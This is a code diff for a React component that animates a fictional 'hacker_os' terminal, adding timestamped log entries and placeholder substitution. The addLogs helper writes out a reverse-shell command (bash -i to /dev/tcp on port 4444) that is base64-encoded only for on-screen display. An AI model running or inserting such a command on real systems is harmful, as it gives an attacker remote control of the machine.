@@ -1,8 +1,13 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { ALL_PHASE_TEMPLATES, REAL_CVE_DATABASE, AUTO_LOGS, MAX_PHASE, PHASE_NUMBERS, INITIAL_PHASE_MESSAGES, SHUTDOWN_LOGS } from './data';
 
+interface LogEntry {
+  text: string;
+  timestamp: string;
+}
+
 const App: React.FC = () => {
-  const [displayedLogs, setDisplayedLogs] = useState<string[]>([]);
+  const [displayedLogs, setDisplayedLogs] = useState<LogEntry[]>([]);
   const [activeMessage, setActiveMessage] = useState<string>("Initializing hacker_os...");
   const [activeTask, setActiveTask] = useState<string>("BOOTING SYSTEM");
   const [targetIP, setTargetIP] = useState<string>("0.0.0.0");
@@ -23,6 +28,30 @@ const App: React.FC = () => {
   const logIndexRef = useRef(0);
   const keyCounterRef = useRef(0);
   const bottomRef = useRef<HTMLDivElement>(null);
+
+  const getCurrentTimeInfo = () => {
+    const now = new Date();
+    return {
+      full: now.toLocaleTimeString('en-US', { hour12: false }),
+      date: now.toLocaleString('en-US', { month: 'short', day: 'numeric' }),
+      simple: now.toLocaleTimeString('ja-JP', { hour12: false })
+    };
+  };
+
+  const addLogs = (texts: string[]) => {
+    const time = getCurrentTimeInfo();
+    const newEntries = texts.map(t => {
+      const processed = t
+        .replace(/{TIME}/g, time.full)
+        .replace(/{DATE}/g, time.date)
+        .replace(/{IP}/g, targetIP)
+        .replace(/{DOMAIN}/g, targetDomain)
+        .replace(/{ATTACKER_IP}/g, attackerIP)
+        .replace(/{B64_CMD}/g, btoa(`bash -i >& /dev/tcp/${attackerIP}/4444 0>&1`));
+      return { text: processed, timestamp: time.simple };
+    });
+    setDisplayedLogs(prev => [...prev, ...newEntries]);
+  };
 
   useEffect(() => {
     const fetchInitialData = async () => {
@@ -72,7 +101,7 @@ const App: React.FC = () => {
       return;
     }
     const timer = setTimeout(() => {
-      setDisplayedLogs(prev => [...prev, AUTO_LOGS[autoIdx]]);
+      addLogs([AUTO_LOGS[autoIdx]]);
       setAutoIdx(prev => prev + 1);
     }, 300);
     return () => clearTimeout(timer);
@@ -96,7 +125,7 @@ const App: React.FC = () => {
       return;
     }
     const timer = setTimeout(() => {
-      setDisplayedLogs(prev => [...prev, SHUTDOWN_LOGS[shutdownIdx]]);
+      addLogs([SHUTDOWN_LOGS[shutdownIdx]]);
       setShutdownIdx(prev => prev + 1);
     }, 100);
     return () => clearTimeout(timer);
@@ -138,14 +167,14 @@ const App: React.FC = () => {
         
         const item = current[logIndexRef.current];
         
-        if (item.log === "{RAW_JSON}") setDisplayedLogs(prev => [...prev, rawJSON]);
-        else if (item.log === "{CVE_DATA}") setDisplayedLogs(prev => [...prev, ...REAL_CVE_DATABASE]);
-        else if (item.log === "{GCC_OUTPUT}") setDisplayedLogs(prev => [...prev, ...gccOutput.split('\n')]);
+        if (item.log === "{RAW_JSON}") addLogs([rawJSON]);
+        else if (item.log === "{CVE_DATA}") addLogs(REAL_CVE_DATABASE);
+        else if (item.log === "{GCC_OUTPUT}") addLogs(gccOutput.split('\n'));
         else if (item.log === "{WAIT_SEARCH}") {
           setIsSearching(true);
-          setDisplayedLogs(prev => [...prev, "Processing... [WAIT]"]);
+          addLogs(["Processing... [WAIT]"]);
           setTimeout(() => {
-            setDisplayedLogs(prev => [...prev, "Complete."]);
+            addLogs(["Complete."]);
             setIsSearching(false);
             logIndexRef.current += 1;
             if (logIndexRef.current >= current.length) {
@@ -166,8 +195,7 @@ const App: React.FC = () => {
           setShutdownIdx(0);
           return;
         } else {
-          const line = item.log.replace(/{IP}/g, targetIP).replace(/{DOMAIN}/g, targetDomain).replace(/{ATTACKER_IP}/g, attackerIP).replace(/{B64_CMD}/g, btoa(`bash -i >& /dev/tcp/${attackerIP}/4444 0>&1`));
-          setDisplayedLogs(prev => [...prev, ...line.split('\n')]);
+          addLogs([item.log]);
         }
         
         setActiveMessage(item.msg);
@@ -191,8 +219,8 @@ const App: React.FC = () => {
 
   useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [displayedLogs]);
 
-  const lastTargetIdx = displayedLogs.findLastIndex(l => l?.includes('@target-server') || ['www-data','root'].includes(l));
-  const lastLogoutIdx = displayedLogs.findLastIndex(l => l === 'logout');
+  const lastTargetIdx = displayedLogs.findLastIndex(l => l.text.includes('@target-server') || ['www-data','root'].includes(l.text));
+  const lastLogoutIdx = displayedLogs.findLastIndex(l => l.text === 'logout');
   const isTarget = lastTargetIdx > lastLogoutIdx;
 
   return (
@@ -202,28 +230,28 @@ const App: React.FC = () => {
         <div className="w-full flex flex-col text-base md:text-lg pb-24 tracking-tighter">
           {displayedLogs.map((log, i) => (
             <div key={i} className="flex space-x-3 py-0">
-              <span className="opacity-40 text-[11px] shrink-0 mt-1">[{new Date().toLocaleTimeString()}]</span>
+              <span className="opacity-40 text-[11px] shrink-0 mt-1">[{log.timestamp}]</span>
               <span className={`
                 whitespace-pre-wrap
-                ${log.includes('@target-server') || ['www-data','root','logout'].includes(log) ? 'text-[#ffb000]' : ''}
-                ${log.includes('warning:') || log.includes('error:') ? 'text-white italic opacity-80' : ''}
-                ${['[BUILD]','[TEST]','[DEPLOY]','[CHECK]'].some(p => log.startsWith(p)) ? 'text-purple-300' : ''}
-                ${log.startsWith('[SUCCESS]') ? 'text-cyan-400 font-bold' : ''}
-                ${log.startsWith('[INFO]') ? 'text-yellow-100 font-bold' : ''}
-                ${log.startsWith('[!]') ? 'text-red-500 font-black' : ''}
-                ${log.startsWith('[  OK  ]') ? 'text-[#00ff41] font-bold' : ''}
-                ${log.startsWith('[SEND]') ? 'text-cyan-400 font-bold' : ''}
-                ${log.startsWith('[RECV]') ? 'text-yellow-400 font-bold' : ''}
-                ${log.startsWith('---') ? 'text-white/20' : ''}
-                ${log.startsWith('●') ? 'text-red-500 animate-pulse' : ''}
-                ${log.includes('Active: deactivating') ? 'text-yellow-400 italic' : ''}
-                ${log.includes('Main PID:') ? 'text-white/70' : ''}
-              `}>{log}</span>
+                ${log.text.includes('@target-server') || ['www-data','root','logout'].includes(log.text) ? 'text-[#ffb000]' : ''}
+                ${log.text.includes('warning:') || log.text.includes('error:') ? 'text-white italic opacity-80' : ''}
+                ${['[BUILD]','[TEST]','[DEPLOY]','[CHECK]'].some(p => log.text.startsWith(p)) ? 'text-purple-300' : ''}
+                ${log.text.startsWith('[SUCCESS]') ? 'text-cyan-400 font-bold' : ''}
+                ${log.text.startsWith('[INFO]') ? 'text-yellow-100 font-bold' : ''}
+                ${log.text.startsWith('[!]') ? 'text-red-500 font-black' : ''}
+                ${log.text.startsWith('[  OK  ]') ? 'text-[#00ff41] font-bold' : ''}
+                ${log.text.startsWith('[SEND]') || log.text.startsWith('[RECV]') ? 'text-[#00ff41] font-bold' : ''}
+                ${log.text.startsWith('[RUN]') || log.text.startsWith('[DONE]') ? 'text-[#00ff41] font-bold' : ''}
+                ${log.text.startsWith('---') ? 'text-white/20' : ''}
+                ${log.text.startsWith('●') ? 'text-red-500 animate-pulse' : ''}
+                ${log.text.includes('Active: deactivating') ? 'text-yellow-400 italic' : ''}
+                ${log.text.includes('Main PID:') ? 'text-white/70' : ''}
+              `}>{log.text}</span>
             </div>
           ))}
           <div className="flex items-center space-x-4 pt-3">
             <span className={`font-bold shrink-0 opacity-80 ${isTarget ? 'text-[#ffb000]' : 'text-[#00ff41]'}`}>
-              {isTarget ? (displayedLogs.findLast(l => l?.includes('root')) ? 'root@target-server:/#' : 'www-data@target-server:/$') : 'root@hacker_os:~#'}
+              {isTarget ? (displayedLogs.findLast(l => l.text.includes('root')) ? 'root@target-server:/#' : 'www-data@target-server:/$') : 'root@hacker_os:~#'}
             </span>
             {waitingForEnter ? <span className="text-white font-bold text-sm bg-green-900 px-2 py-1 ml-2 border border-white/20">PRESS [ENTER]</span> : 
              autoIdx !== -1 || shutdownIdx !== -1 ? <span className="text-purple-400 font-bold text-sm ml-2 tracking-widest uppercase">Executing Payload... [AUTO]</span> :
